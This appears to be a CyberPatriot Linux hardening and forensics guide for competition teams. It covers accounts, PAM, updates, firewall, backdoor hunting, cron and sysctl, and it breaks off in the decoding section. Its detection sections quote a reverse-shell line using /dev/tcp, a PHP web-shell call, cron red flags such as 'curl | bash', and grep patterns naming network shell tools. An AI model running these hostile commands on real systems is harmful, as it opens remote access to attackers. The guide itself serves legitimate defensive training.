    #RULES Golden rules

    1. Read the whole README first. Write down the authorized users, the authorized admins, and any required services or software. The README always wins over this guide.
    2. Answer the forensics questions first. Many answers depend on files or users you might delete later.
    3. Never delete or lock your own account (the one you're logged in as) or any user the README lists.
    4. Never remove a service the README says is critical. If the README says the machine is an FTP server, harden FTP; don't uninstall it.
    5. Check the scoring report after every few changes. If your score drops, undo your last change right away.
    6. Keep a change log on paper or in a text file: what you changed and when. It makes undoing mistakes easy.
    7. One person per area. Split the team so two people aren't editing the same file.

    #TERMINAL Terminal and nano basics

    Open a terminal with Ctrl+Alt+T (or search "Terminal" in the app menu). Commands that change the system need sudo in front; it will ask for your password, and the cursor won't move while you type it. That's normal.

    Keys What it does
    Tab Auto-completes file and command names. Use it constantly.
    Up arrow Brings back your last command
    Ctrl+C Stops the running command
    Ctrl+Shift+C / Ctrl+Shift+V Copy / paste inside the terminal
    clear Clears the screen
    man <command> Opens the manual for a command (press q to quit)
    <command> --help Short help for a command

    To edit a config file, use nano: sudo nano /etc/ssh/sshd_config

    nano keys What it does
    Ctrl+W Search inside the file
    Ctrl+O, then Enter Save
    Ctrl+X Exit
    Ctrl+K Cut a whole line
    Alt+U Undo

    If you prefer a normal window, sudo gedit <file> (Ubuntu) or sudo xed <file> (Mint) opens a regular text editor.

    Before editing any config file, back it up: sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak. If you break it, copy the .bak back.

    #DIRS Linux directory structure

    Linux has one single tree that starts at / (called "root"). There are no drive letters like C:. Every disk, USB stick and folder hangs somewhere off /. Most CyberPatriot fixes live in three places: /etc (settings), /home (users' files), and /var/log (logs).

    Search terms: folder, directory, path, where is, location, filesystem, tree

    #DIRS-MAP The important folders

    Folder What lives there Why you care in CyberPatriot
    / The top of everything Start point for searches: sudo find / -name ...
    /etc System-wide settings (text files) Almost every hardening fix: passwords, SSH, users, firewall
    /home One folder per normal user (/home/alice) Prohibited media, hacking tools, hidden files, forensics answers
    /root Home folder of the root (super) user Check for hidden scripts and tools
    /var Data that changes: logs, websites, mail, caches /var/log for logs, /var/www for web servers
    /var/log Log files Who logged in, what was installed, auth failures
    /var/www Website files (Apache/Nginx) Web shells and backdoors hide here
    /tmp and /var/tmp Temporary files, anyone can write Malware often drops files here
    /bin, /usr/bin Programs everyone can run Suspicious programs, renamed tools
    /sbin, /usr/sbin Admin programs Same as above
    /usr/local/bin Programs installed by hand, not by apt Very common hiding spot for backdoors
    /opt Optional/third-party software Games and hacking tools installed outside apt
    /usr/share Shared data, docs, wordlists Hacking wordlists, games data
    /lib, /usr/lib Libraries that programs use Rootkits sometimes hide here
    /boot Kernel and bootloader Rarely touched in competition
    /dev Hardware shown as files Rarely touched
    /proc Live info about running processes /proc/<PID>/exe shows what a process really is

    #DIRS-HIDDEN Hidden files

    Any file or folder whose name starts with a dot (.bashrc, .secret) is hidden. ls won't show it; ls -la will. Always use ls -la when hunting.

    Common hidden files in a home folder: .bashrc (runs every time the user opens a terminal; backdoors get added here), .bash_history (commands the user typed; great for forensics), .ssh/authorized_keys (keys that can log in without a password).

    #DIRS-NAV Moving around

    Command What it does
    pwd Shows the folder you're in
    ls -la Lists everything, including hidden files, with permissions and owners
    cd /etc Go to /etc
    cd ~ or cd Go to your home folder
    cd .. Go up one folder
    cd - Go back to the last folder
    tree -a /home Draws the folder tree (install with sudo apt install tree)
    xdg-open . Opens the current folder in the file manager window

    Absolute vs relative paths: /home/alice/Music always means the same place. Music means "the Music folder inside wherever I am right now." If a command can't find a file, try the full path.

    #USERS Users, groups, passwords and sudo

    Compare every human account on the machine against the README's lists. Remove anyone not listed, add anyone missing, and make sure only the listed admins are in the sudo group. These are usually the easiest points in the round.

    Search terms: user, account, unauthorized, delete user, add user, administrator, admin, sudo, group, uid, password, hidden user

    #USERS-LIST Step 1: See every user

    Human users have a UID (user ID number) of 1000 or higher. System accounts (like www-data, sshd) are below 1000. Leave system accounts alone unless something is clearly wrong.

    # Show only human users (UID 1000+), plus anything with UID 0
awk -F: '($3 >= 1000 && $3 < 65534) || $3 == 0 {print $1, "UID=" $3, $7}' /etc/passwd

# Show the whole file
cat /etc/passwd

    Each line in /etc/passwd looks like: alice:x:1001:1001:Alice Smith:/home/alice:/bin/bash. The fields are username : x : UID : GID : full name : home folder : shell.

    Red flags to look for:

    • Any user besides root with UID 0. UID 0 means full root power, no matter the name. Fix: sudo usermod -u 1050 <user> (pick an unused number) or delete the account if unauthorized.
    • A system account (UID under 1000) with a real shell like /bin/bash. Most should have /usr/sbin/nologin or /bin/false.
    • A user not in the README, even with an innocent-looking name.
    • A user whose home folder is somewhere odd, like /tmp or /root.

    #USERS-DEL Step 2: Remove unauthorized users

    Before deleting, check the forensics questions. An answer may live in that user's home folder.

    sudo deluser <username>                 # remove the account, keep their files
sudo deluser --remove-home <username>   # remove the account and /home/<username>

    If deluser complains the user is logged in or running something: sudo pkill -u <username> first, then delete.

    GUI option: Settings > Users (Ubuntu) or Users and Groups (Mint). Unlock, select the user, click Remove.

    #USERS-ADD Step 3: Add missing users

    sudo adduser <username>     # interactive: asks for a password and details

    If the README says a user should exist but they're missing, add them. If it lists a group they should be in, see #GROUPS below.

    #ADMINS Step 4: Fix who is an administrator

    On Ubuntu and Mint, admins are the members of the sudo group (sometimes also adm, which can read logs). Some images also use an admin group, and some sneak users into the sudoers file directly.

    getent group sudo           # who is in sudo
getent group adm            # who is in adm
getent group admin          # older group name, may not exist

sudo gpasswd -d <user> sudo     # REMOVE user from sudo (make them a normal user)
sudo usermod -aG sudo <user>    # ADD user to sudo (make them an admin)

    Watch out: in usermod -aG, the -a (append) is critical. Without it, -G replaces all of the user's groups.

    Check the sudoers file too. Someone can be given sudo power without being in the group.

    sudo cat /etc/sudoers
sudo ls -la /etc/sudoers.d/
sudo cat /etc/sudoers.d/*

    Things that should not be there:

    • <user> ALL=(ALL) NOPASSWD: ALL for a user who isn't an admin. NOPASSWD means no password is ever asked.
    • ALL ALL=(ALL) ALL or %users ALL=... giving everyone sudo.
    • Defaults !authenticate (turns off password prompts for sudo).

    Only ever edit sudoers with sudo visudo (for the main file) or sudo visudo -f /etc/sudoers.d/<file>. visudo checks your edit for mistakes. A typo made with plain nano can lock everyone out of sudo.

    #GROUPS Other groups

    The README sometimes says "create a group called X and add these users."

    sudo groupadd <group>              # create a group
sudo usermod -aG <group> <user>    # add a user to it
sudo gpasswd -d <user> <group>     # remove a user from it
sudo groupdel <group>              # delete a group
groups <user>                      # what groups is this user in?
getent group <group>               # who is in this group?

    #PASSWORDS Step 5: Fix passwords

    Give every user a strong password, except your own if the README says not to change it. A strong password has 12+ characters with upper and lower case, numbers and symbols, like Cyb3r!Patr1ot#2026. Write down any password you set.

    sudo passwd <username>          # set a new password for one user

    Change many users at once (type the list of users carefully):

    for u in alice bob carol; do echo "$u:Cyb3r!Patr1ot#2026" | sudo chpasswd; done

    Find users with no password at all (very common vulnerability):

    sudo awk -F: '($2 == "") {print $1}' /etc/shadow

    In /etc/shadow, the second field is the password hash. Empty means no password. ! or * means the account is locked (normal for system accounts).

    #USERS-LOCK Lock and disable accounts

    sudo passwd -l <user>           # lock a password (user can't log in with it)
sudo passwd -u <user>           # unlock
sudo usermod -s /usr/sbin/nologin <user>   # stop a user from getting a shell
sudo passwd -l root             # lock the root account's password (common fix)

    Disable root login is a frequent scoring item. Locking root's password (sudo passwd -l root) is the standard fix on Ubuntu, since admins use sudo instead. Also see #SSH for PermitRootLogin no.

    #USERS-AGE Per-user password aging

    The policy in /etc/login.defs (#PWPOLICY) only applies to new users. Existing users need it set one by one:

    sudo chage -l <user>                   # see a user's current aging settings
sudo chage -M 90 -m 7 -W 14 <user>     # max 90 days, min 7 days, warn 14 days before

# apply to every human user at once
for u in $(awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd); do sudo chage -M 90 -m 7 -W 14 "$u"; done

    #PWPOLICY Password and account policy (PAM, login.defs)

    A "secure password policy" on Linux is set in three places: /etc/login.defs controls how long passwords last, /etc/pam.d/common-password (plus pwquality.conf) controls how strong they must be and history, and /etc/pam.d/common-auth (plus faillock.conf) controls lockout. Each of these is usually its own scoring item.

    Search terms: password policy, PAM, minimum length, minlen, history, remember, complexity, ucredit, lcredit, dcredit, ocredit, maximum age, PASS_MAX_DAYS, PASS_MIN_DAYS, lockout, faillock, deny, nullok, null password

    #PAM-SAFETY Read this before touching PAM

    PAM files control logins. One typo can lock every user out, including you. Follow these steps every time:

    1. Open a terminal and run sudo -i to get a root shell. Leave this terminal open the whole time; it's your lifeline.
    2. Back up the file first: sudo cp /etc/pam.d/common-password /etc/pam.d/common-password.bak
    3. Make your edit in a second terminal.
    4. Test: open a third terminal and run sudo -k; sudo whoami. If it asks for your password and prints root, you're good.
    5. If it's broken, use the root terminal from step 1 to copy the .bak file back.

    #PWAGE Password aging: /etc/login.defs

    sudo nano /etc/login.defs

    Ctrl+W to search for PASS_MAX_DAYS and set these lines (they're not commented out; just change the numbers):

    PASS_MAX_DAYS   90
PASS_MIN_DAYS   7
PASS_WARN_AGE   14
    Setting Meaning Good value
    PASS_MAX_DAYS Password must be changed after this many days 90 (anything 30–90 usually scores)
    PASS_MIN_DAYS Must wait this long before changing again 7 (must be more than 0)
    PASS_WARN_AGE Days of warning before it expires 14

    Also check in the same file: ENCRYPT_METHOD should be SHA512 or YESCRYPT (never MD5 or DES), and UMASK is commonly set to 027 or 077 for stricter default file permissions.

    Remember: login.defs only affects new users. Run the chage loop in #USERS-AGE for existing users.

    #PWCOMPLEX Password length and complexity

    First make sure the complexity module is installed:

    sudo apt install libpam-pwquality -y

    Then edit the rules file:

    sudo nano /etc/security/pwquality.conf

    Uncomment (remove the #) and set these lines:

    minlen = 12
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
minclass = 4
maxrepeat = 3
usercheck = 1
dictcheck = 1
enforce_for_root
    Setting Meaning
    minlen = 12 At least 12 characters
    dcredit = -1 At least 1 digit (negative number = "required count")
    ucredit = -1 At least 1 uppercase letter
    lcredit = -1 At least 1 lowercase letter
    ocredit = -1 At least 1 symbol
    minclass = 4 Must use all 4 character types
    maxrepeat = 3 No more than 3 of the same character in a row
    usercheck = 1 Can't contain the username
    dictcheck = 1 Can't be a dictionary word

    Some scoring engines check /etc/pam.d/common-password directly instead of pwquality.conf. To cover both, also put the settings on the pwquality line there:

    sudo nano /etc/pam.d/common-password

    Find the line starting with password requisite pam_pwquality.so and make it:

    password    requisite    pam_pwquality.so retry=3 minlen=12 dcredit=-1 ucredit=-1 lcredit=-1 ocredit=-1

    #PWHISTORY Password history (no reusing old passwords)

    In the same /etc/pam.d/common-password, find the pam_unix.so line. It looks like:

    password    [success=1 default=ignore]    pam_unix.so obscure use_authtok try_first_pass yescrypt

    Add remember=5 to the end of it (keep everything else). Then, on the line directly above it, add a pwhistory line:

    password    required    pam_pwhistory.so remember=5 enforce_for_root use_authtok
password    [success=1 default=ignore]    pam_unix.so obscure use_authtok try_first_pass yescrypt remember=5

    The word in the pam_unix line may say sha512 instead of yescrypt. Leave it as it is; only add to the end.

    #NULLOK No blank passwords allowed

    nullok lets accounts with empty passwords log in. Removing it is a very common scoring item.

    sudo grep -rn nullok /etc/pam.d/

    For every line found (usually in common-auth and maybe common-password), edit the file and delete just the word nullok, leaving the rest of the line. Then double-check no user has a blank password (#PASSWORDS).

    #LOCKOUT Account lockout (faillock)

    Ubuntu 22.04+ and Mint 21+ use pam_faillock. (Older images used pam_tally2, which no longer exists. If you see a guide using tally2, it's out of date.)

    Step 1: Set the lockout rules.

    sudo nano /etc/security/faillock.conf

    Uncomment and set:

    deny = 5
unlock_time = 900
fail_interval = 900

    That means: 5 bad passwords within 15 minutes locks the account for 15 minutes (900 seconds). Don't set unlock_time = 0 (that means locked forever until an admin unlocks it).

    Step 2: Turn faillock on in PAM. The safest way on Ubuntu is to use pam-auth-update instead of editing common-auth by hand. Create two small profile files:

    sudo nano /usr/share/pam-configs/faillock

    Paste exactly:

    Name: Enable pam_faillock to deny access
Default: yes
Priority: 0
Auth-Type: Primary
Auth:
    [default=die]   pam_faillock.so authfail

    sudo nano /usr/share/pam-configs/faillock_notify

    Paste exactly:

    Name: Notify of failed login attempts and reset count upon success
Default: yes
Priority: 1024
Auth-Type: Primary
Auth:
    requisite   pam_faillock.so preauth
Account-Type: Primary
Account:
    required    pam_faillock.so

    Then run:

    sudo pam-auth-update

    Use the arrow keys and spacebar to make sure both new faillock entries have a *, then Tab to OK and press Enter.

    Step 3: Check it worked.

    grep faillock /etc/pam.d/common-auth /etc/pam.d/common-account
sudo faillock --user <user>             # see failed attempts for a user
sudo faillock --user <user> --reset     # unlock a user

    #PWPOLICY-CHECK Quick check of all policy settings

    grep -E '^PASS_(MAX|MIN|WARN)' /etc/login.defs
grep -vE '^#|^$' /etc/security/pwquality.conf
grep -vE '^#|^$' /etc/security/faillock.conf
grep -vE '^#|^$' /etc/pam.d/common-password
grep -vE '^#|^$' /etc/pam.d/common-auth

    (grep -vE '^#|^$' hides comment lines and blank lines, so you only see active settings.)

    #UPDATES Updates and packages

    Turn on automatic security updates, make sure update sources are legit, then install updates for the OS and any software the README mentions (often Firefox, the kernel, OpenSSH, Apache, Samba). Start the big update early. It runs in the background while you work on other things.

    Search terms: update, upgrade, apt, patch, latest version, automatic updates, unattended-upgrades, sources.list, repository, repo, PPA, software updater, firefox, kernel

    #UPDATES-AUTO Turn on automatic updates

    GUI (easiest, and what most scoring checks look at):

    • Ubuntu: open Software & Updates > Updates tab. Set "Automatically check for updates" to Daily. Set "When there are security updates" to Download and install automatically. Make sure the security source is checked on the Ubuntu Software tab.
    • Mint: open Update Manager > Edit > Preferences > Automation tab. Turn on Automatic updates. Pick a fast mirror under Software Sources if updates are slow.

    Command line (does the same thing):

    sudo apt install unattended-upgrades -y
sudo dpkg-reconfigure --priority=low unattended-upgrades    # choose Yes
cat /etc/apt/apt.conf.d/20auto-upgrades

    The file should contain:

    APT::Periodic::Update-Package-Lists "1";
APT::Periodic::Unattended-Upgrade "1";

    If it says "0", edit it to "1". Some images also check /etc/apt/apt.conf.d/10periodic for the same lines.

    #UPDATES-SOURCES Check where updates come from

    A hacked machine might point to a fake update server, or have the real ones removed or commented out.

    cat /etc/apt/sources.list
ls /etc/apt/sources.list.d/
cat /etc/apt/sources.list.d/*

    Newer Ubuntu (24.04+) uses /etc/apt/sources.list.d/ubuntu.sources instead of sources.list.

    What good lines look like: they point to archive.ubuntu.com, security.ubuntu.com, a country mirror like us.archive.ubuntu.com, or for Mint packages.linuxmint.com. The suites should include your version's name (like jammy or noble) plus -updates and -security.

    Red flags: unknown websites or IP addresses, PPAs for hacking tools, or the security line commented out with #. Comment out or remove the bad lines, uncomment the security line, then run sudo apt update.

    To find your version name: lsb_release -a or cat /etc/os-release.

    #UPDATES-INSTALL Install updates

    sudo apt update                  # refresh the list of available updates (always first)
sudo apt upgrade -y              # install updates
sudo apt full-upgrade -y         # also handles updates that add/remove packages (kernel)
sudo apt autoremove -y           # clean out packages no longer needed

    The full upgrade can take 20–60 minutes. Run it in its own terminal and keep working in another one. Don't close the terminal or reboot while it runs.

    If apt says "could not get lock": another update is already running (often the GUI updater). Wait a few minutes. Only if nothing is running (ps aux | grep -i apt), remove the stale lock: sudo rm /var/lib/dpkg/lock-frontend /var/lib/dpkg/lock and then sudo dpkg --configure -a.

    #UPDATES-ONE Update one specific program

    If the README or scoring says a specific program needs updating, update just that one. It's much faster:

    sudo apt update
sudo apt install --only-upgrade firefox -y
sudo apt install --only-upgrade openssh-server -y
apt list --upgradable              # what has updates waiting
apt policy <package>               # installed version vs available version

    Firefox on Ubuntu 22.04+ is a snap. Update it with sudo snap refresh firefox (close Firefox first). Update all snaps with sudo snap refresh.

    #FIREWALL Firewall (ufw)

    Ubuntu and Mint use ufw (Uncomplicated Firewall). Turning it on is almost always a scoring item: sudo ufw enable. Before enabling it, allow any service the README says must stay reachable (SSH, web, FTP), or you'll block the very service you're protecting.

    Search terms: firewall, ufw, gufw, port, allow, deny, block, incoming, outgoing, iptables, nftables, logging

    #FIREWALL-ON Turn it on (the right order)

    sudo apt install ufw -y              # usually already installed
sudo ufw default deny incoming       # block everything coming in by default
sudo ufw default allow outgoing      # let the machine reach out (updates)

# Allow ONLY the services the README says are required, for example:
sudo ufw allow ssh                   # port 22, only if SSH is required
sudo ufw allow http                  # port 80, only if it's a web server
sudo ufw allow https                 # port 443

sudo ufw logging on                  # logging is often a scoring item too
sudo ufw enable                      # turn it on (answer y)
sudo ufw status verbose              # check it

    GUI option: install gufw (sudo apt install gufw -y), open "Firewall Configuration," and flip Status to On. Mint has it preinstalled.

    #PORTS Common ports

    Service Port ufw command
    SSH 22/tcp sudo ufw allow 22/tcp
    FTP 21/tcp (plus passive range) sudo ufw allow 21/tcp
    HTTP (web) 80/tcp sudo ufw allow 80/tcp

    #MALWARE Malware and backdoors

    A backdoor is anything that lets an attacker back in: a program listening on a port, a scheduled task that reconnects, a hidden user, a modified login file. Hunt in this order:

    #MALWARE-NET 1. What's listening on the network?

    sudo ss -tulnp

    Normal: sshd on 22 (if SSH is required), systemd-resolve on 53 (localhost only), cupsd on 631 (localhost), apache2 on 80 (if web server). Suspicious: nc, ncat, python, perl, bash, sh, or anything on ports like 4444, 1337, 31337, 6667, 8888, 9999.

    Found one? Get the PID (the number after pid=), then:

    sudo ls -l /proc/<PID>/exe           # what program it really is
sudo cat /proc/<PID>/cmdline | tr '\0' ' '; echo   # how it was started
ps -o ppid= -p <PID>                 # its parent process
sudo kill -9 <PID>                   # stop it

    Then find what keeps starting it (steps 2–5) and remove the program file itself.

    #MALWARE-PROC 2. Suspicious running processes

    ps aux --sort=-%cpu | head -20      # biggest CPU users
ps auxf                             # tree view: see parent/child
ps aux | grep -iE 'nc |ncat|netcat|socat|python.*socket|perl.*socket|bash -i|/dev/tcp|sh -i'

    bash -i >& /dev/tcp/<ip>/<port> is a classic reverse shell. If you see /dev/tcp anywhere, that's a backdoor.

    #MALWARE-PERSIST 3. Places malware restarts from (persistence)

    Where How to check
    Cron jobs See #CRON
    systemd services systemctl list-unit-files --state=enabled; ls -la /etc/systemd/system/ /lib/systemd/system/ | grep -v '^l' (look for odd names, recent dates)
    rc.local cat /etc/rc.local (should be empty or not exist)
    Shell startup files cat /etc/bash.bashrc /etc/profile; ls /etc/profile.d/; cat /home/*/.bashrc /home/*/.profile /root/.bashrc
    Desktop autostart ls -la /etc/xdg/autostart/ /home/*/.config/autostart/
    Preloaded libraries (rootkit trick) cat /etc/ld.so.preload (should not exist or be empty)
    Hosts file cat /etc/hosts (only localhost lines and the machine's own name)
    SSH keys sudo cat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys
    Aliases that replace real commands alias and grep .bashrc for alias sudo= or alias ls=

    To check a systemd service you don't recognize:

    systemctl cat <service>          # shows the file, including ExecStart (the program it runs)
sudo systemctl disable --now <service>
sudo rm /etc/systemd/system/<service>.service
sudo systemctl daemon-reload

    #MALWARE-SUID 4. SUID files (run as root)

    A SUID program runs with its owner's power. Attackers plant SUID copies of bash, find, vim, python to get root later.

    sudo find / -perm -4000 -type f 2>/dev/null

    Normal ones: sudo, passwd, su, mount, umount, ping, chsh, chfn, newgrp, gpasswd, pkexec, fusermount. Suspicious: anything in /tmp, /home, or SUID on bash, dash, find, vim, nano, python*, perl, nmap, cp. Fix: sudo chmod u-s /path/to/file (or delete if planted).

    #MALWARE-RECENT 5. Recently changed files

    # files changed in the last 3 days, outside noisy system folders
sudo find / -type f -mtime -3 -not -path '/proc/*' -not -path '/sys/*' -not -path '/run/*' -not -path '/var/lib/*' -not -path '/var/cache/*' 2>/dev/null | head -100

# programs not owned by any package (planted by hand)
for f in /usr/local/bin/* /usr/bin/* /usr/sbin/*; do dpkg -S "$f" >/dev/null 2>&1 || echo "NOT FROM A PACKAGE: $f"; done

    #MALWARE-WEB 6. Web shells (web servers only)

    sudo grep -rlE 'eval\(|base64_decode|shell_exec|system\(|passthru|exec\(' /var/www/ 2>/dev/null
sudo find /var/www -name '*.php' -newer /etc/hostname

    A PHP file that runs commands from a web request (e.g. system($_GET['cmd'])) is a web shell. Delete it.

    #MALWARE-SCAN 7. Scanners

    sudo apt install rkhunter chkrootkit clamav -y
sudo rkhunter --update; sudo rkhunter --check --sk     # rootkit check (--sk skips keypresses)
sudo chkrootkit
sudo freshclam; sudo clamscan -r -i /home /tmp /var/www  # virus scan, show infected only

    Scanners find some things, but most CyberPatriot backdoors are custom scripts. The manual hunt above finds more.

    #PERMS Permissions, cron, kernel settings and other fixes

    These are the "deeper" points that separate good teams from great ones: correct permissions on sensitive files, no malicious scheduled tasks, secure kernel network settings, and a locked-down login screen.

    Search terms: permissions, chmod, chown, owner, shadow, world-writable, cron, crontab, scheduled task, sysctl, kernel, ip forwarding, syn cookies, redirects, guest account, lightdm, gdm, login screen, autologin, auditd, apparmor, ctrl-alt-del

    #PERMS-READ Reading permissions

    ls -l /etc/shadow shows something like -rw-r----- 1 root shadow 1234 ...

    Part Meaning
    First character - file, d directory, l link
    Next 3 (rw-) Owner's rights: read, write, execute
    Next 3 (r--) Group's rights
    Last 3 (---) Everyone else's rights
    root shadow Owner is root, group is shadow

    Numbers: r=4, w=2, x=1. Add them per group. rw-r----- = 6,4,0 = 640. rwxr-xr-x = 755.

    #PERMS-FIX Correct permissions for key files

    File Should be Fix command
    /etc/passwd 644 root:root sudo chmod 644 /etc/passwd; sudo chown root:root /etc/passwd
    /etc/shadow 640 root:shadow (or 600/000) sudo chmod 640 /etc/shadow; sudo chown root:shadow /etc/shadow
    /etc/group 644 root:root sudo chmod 644 /etc/group
    /etc/gshadow 640 root:shadow sudo chmod 640 /etc/gshadow; sudo chown root:shadow /etc/gshadow
    /etc/sudoers 440 root:root sudo chmod 440 /etc/sudoers
    /etc/ssh/sshd_config 600 root:root sudo chmod 600 /etc/ssh/sshd_config
    /etc/crontab 600 root:root sudo chmod 600 /etc/crontab
    /home/<user> 750 or 700, owned by that user sudo chmod 750 /home/<user>; sudo chown <user>:<user> /home/<user>
    /root 700 root:root sudo chmod 700 /root
    /boot/grub/grub.cfg 600 root:root sudo chmod 600 /boot/grub/grub.cfg

    Find world-writable files (anyone can change them; dangerous outside /tmp):

    sudo find / -xdev -type f -perm -0002 -not -path '/proc/*' 2>/dev/null
sudo find / -xdev -type d -perm -0002 -not -perm -1000 2>/dev/null   # writable folders without the sticky bit

    Fix with sudo chmod o-w <file>. Also find files with no owner: sudo find / -xdev \( -nouser -o -nogroup \) 2>/dev/null.

    #CRON Scheduled tasks (cron)

    Attackers use cron to re-create backdoors every minute. Check every place cron jobs live:

    sudo cat /etc/crontab
sudo ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/
sudo ls -la /var/spool/cron/crontabs/           # each user's personal crontab
for u in $(cut -d: -f1 /etc/passwd); do sudo crontab -l -u "$u" 2>/dev/null | grep -v '^#' | sed "s/^/$u: /"; done
systemctl list-timers --all                      # systemd timers work like cron too
ls /var/spool/at/ 2>/dev/null; atq               # one-time 'at' jobs

    Reading a cron line: */5 * * * * root /tmp/.x/run.sh means "every 5 minutes, run /tmp/.x/run.sh as root." The five fields are minute, hour, day of month, month, day of week.

    Red flags: jobs running files from /tmp, /dev/shm, or hidden folders; anything with nc, bash -i, /dev/tcp, curl ... | bash, wget, base64 -d; jobs for users who shouldn't exist.

    Remove a bad line by editing: sudo crontab -e -u <user> (or edit the file in /etc/cron.d). Remove a user's whole crontab: sudo crontab -r -u <user>. Delete the script the job ran, too.

    #SYSCTL Kernel network security (sysctl)

    These settings make the network stack resist spoofing and attacks. They are frequent scoring items.

    sudo cp /etc/sysctl.conf /etc/sysctl.conf.bak
sudo nano /etc/sysctl.conf

    Add (or uncomment and fix) these lines at the bottom:

    # Don't act as a router
net.ipv4.ip_forward = 0
# Block SYN flood attacks
net.ipv4.tcp_syncookies = 1
# Ignore spoofed/redirect packets
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_source_route = 0
# Reverse path filtering (anti-spoofing)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
# Log weird packets
net.ipv4.conf.all.log_martians = 1
# Ignore ping broadcasts and bogus errors
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.icmp_ignore_bogus_error_responses = 1
# Memory protection
kernel.randomize_va_space = 2
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
fs.suid_dumpable = 0
fs.protected_hardlinks = 1
fs.protected_symlinks = 1

    Apply without rebooting: sudo sysctl -p. Check one value: sysctl net.ipv4.ip_forward.

    Exception: if the README says the machine is a router or VPN server, it may need ip_forward = 1.

    Also check /etc/sysctl.d/*.conf. A file there can override your settings: grep -r ip_forward /etc/sysctl.d/.

    Example 1: Compare users on the machine to the README list. Put the authorized users (one per line) in allowed.txt first. The script only reports, it doesn't delete. You decide.

    #!/bin/bash
# Report human users that are not in allowed.txt
for u in $(awk -F: '$3>=1000 && $3<65534 {print $1}' /etc/passwd); do
    if ! grep -qx "$u" allowed.txt; then
        echo "NOT AUTHORIZED: $u"
    fi
done
# Report anyone in the sudo group not in admins.txt
for a in $(getent group sudo | cut -d: -f4 | tr ',' ' '); do
    if ! grep -qx "$a" admins.txt; then
        echo "SHOULD NOT BE ADMIN: $a"
    fi
done

    #SCRIPTS-SAFETY Script safety rules

    • Never run a script you can't explain line by line. Especially one found on the image; it might be the malware.
    • Test on a practice image first, never for the first time in a real round.
    • Make scripts report first, then change things only after a human reviews the output.
    • Always quote variables: "$file", not $file. File names with spaces break unquoted commands.
    • rm -rf in a script with an empty variable (rm -rf /$DIR) can wipe the whole system. Double-check.

    #FORENSICS Forensics questions and steganography

    Forensics questions are text files on the Desktop (Forensics Question 1.txt, etc.). Each one asks you to find something on the machine. Type the answer after ANSWER: and save. Each correct answer is usually worth as much as several hardening fixes, and they're often the easiest points in the round.

    Search terms: forensics, forensic question, answer, hash, md5, sha1, sha256, decode, base64, hex, binary, rot13, caesar, cipher, encoded, encrypted, hidden message, steganography, stego, image, exif, metadata, strings, zip, password protected

    #FORENSICS-HOW How to answer them

    1. Do them first. Fixing the machine can destroy the evidence (deleting a user, a file, a log).
    2. Open the question with a text editor: gedit ~/Desktop/Forensics\ Question\ 1.txt (Mint: xed), or double-click it.
    3. Don't edit anything except the ANSWER: line. Keep the format: ANSWER: alice. For multiple answers, the question tells you the format (usually one ANSWER: line per answer).
    4. Copy-paste answers when you can. Typos cost points. Watch for exact case, spacing and full paths.
    5. Save (Ctrl+S). Check the scoring report. A solved question shows up there within a minute or two.
    6. If it's not scoring, re-read the question word for word. Common misses: wrong format, a trailing space, a full path when only a name was asked for (or the reverse).

    #FORENSICS-TYPES Common question types and how to solve them

    Question asks... How to find it
    "What user has UID X" / "which user is hidden" awk -F: '{print $1, $3}' /etc/passwd
    "What is the MD5/SHA hash of file X" See #HASH below
    "Decode this message" See #DECODE below
    "What's the full path of the file containing X" sudo grep -rl 'X' / 2>/dev/null or sudo find / -name '*X*' 2>/dev/null
    "What port is the backdoor listening on" sudo ss -tulnp (see #MALWARE-NET)
    "What program/file is the backdoor" sudo ls -l /proc/<PID>/exe
    "Which IP tried to log in" / "how many failed logins" sudo grep 'Failed password' /var/log/auth.log (count with | wc -l)
    "When was X installed" / "what was installed" grep ' install ' /var/log/dpkg.log, cat /var/log/apt/history.log
    "What command did user X run" sudo cat /home/X/.bash_history
    "What group is X in" / "who is in group Y" groups X, getent group Y
    "What is the hidden message in the image" See #STEGO below
    "What file was modified most recently" ls -lt <dir> | head, or find ... -mmin
    "What's the password stored in file X" sudo grep -ri 'password' /home 2>/dev/null
    "What website does X redirect to" cat /etc/hosts, browser history in ~/.mozilla/firefox/*/places.sqlite
    "What's in the zip/archive" unzip -l file.zip, tar -tvf file.tar.gz
    "Who owns this file" / "what are its permissions" stat <file> or ls -l <file>

    #HASH File hashes

    A hash is a fingerprint of a file. Questions ask for one exact type, so match it:

    md5sum <file>
sha1sum <file>
sha256sum <file>
sha512sum <file>

# Hash a piece of TEXT instead of a file (-n stops an extra newline being added)
echo -n 'hello' | sha256sum

    Answer with just the long hex string, not the filename after it.

    "Which file matches this hash?" Hash every file in a folder and search:

    find /home -type f -exec sha256sum {} \; 2>/dev/null | grep -i '<hash>'

    Identify a hash type by length: 32 hex characters = MD5, 40 = SHA-1, 64 = SHA-256, 128 = SHA-512. Starts with $6$ = Linux SHA-512 password hash; $y$ = yescrypt.

    #DECODE Decoding messages

    Look at the message's characters to guess the encoding:

    It looks like... It's probably Decode with
    Letters, numbers, + /, often ends with = or == (SGVsbG8=) Base64 echo 'SGVsbG8=' | base64 -d
    Only 0–9 and a–f, pairs (48656c6c6f) Hex echo '48656c6c6f' | xxd -r -p
    Only 0 and 1 in groups of 8 Binary See below
    Normal letters, but scrambled words (Uryyb) ROT13 / Caesar echo 'Uryyb' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
    %20, %3A URL encoding python3 -c "import urllib.parse; print(urllib.parse.unquote('Hello%20World'))"
    Uppercase + 2–7, ends in = Base32 echo '<text>' | base32 -d
    Dots and dashes Morse code Decode by hand or with CyberChef
    Numbers 65–122 separated by spaces ASCII codes python3 -c "print(''.join(chr(int(x)) for x in '72 105'.split()))"

    Binary to text:

